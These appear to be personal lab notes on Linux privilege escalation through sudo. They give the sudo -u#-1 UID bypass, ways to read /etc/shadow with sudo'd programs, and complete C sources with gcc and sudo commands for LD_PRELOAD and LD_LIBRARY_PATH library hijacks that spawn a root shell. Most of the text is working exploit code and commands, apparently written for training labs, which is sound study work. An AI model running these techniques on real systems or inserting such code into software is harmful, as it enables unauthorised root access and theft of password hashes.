

# Q. Why SUDO use?

Ans. it used to run any command as per that defined user.

Ex. **sudo -u kali id        -      run id command as kali user**

SUDO not used to run everything as root

# <1.8.28
https://www.sudo.ws/security/advisories/minus_1_uid/

```
sudo -u#-1 id
```

# Commands intended functionalities

Use command for what it is used for

sudo more /etc/shadow

sudo apache2 -f /etc/shadow (give 1st line)

![[Pasted image 20240510224512.png]]


# Shell escaping

general GTFObins thing

# Passing environment variables

![[Pasted image 20240510224723.png]]

https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/

LD_PRELOAD = load custom code first

preload.c
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```


Create a shared object using the code located at /home/user/tools/sudo/preload.c:

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

```bash
sudo LD_PRELOAD=/tmp/preload.so program-name-here (nano,vim etc anything)
```

library_path.c
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```


Run ldd against the apache2 program file to see which shared libraries are used by the program:

```bash
ldd /usr/sbin/apache2
```

![[image 1 2.png]]

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library\_path.c:

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Run apache2 using sudo, while settings the LD\_LIBRARY\_PATH environment variable to /tmp (where we output the compiled shared object):

```bash
sudo LD_LIBRARY_PATH=/tmp apache2
```

## Escalation via Shared Object Injection

* Do strace for such binary and check for files

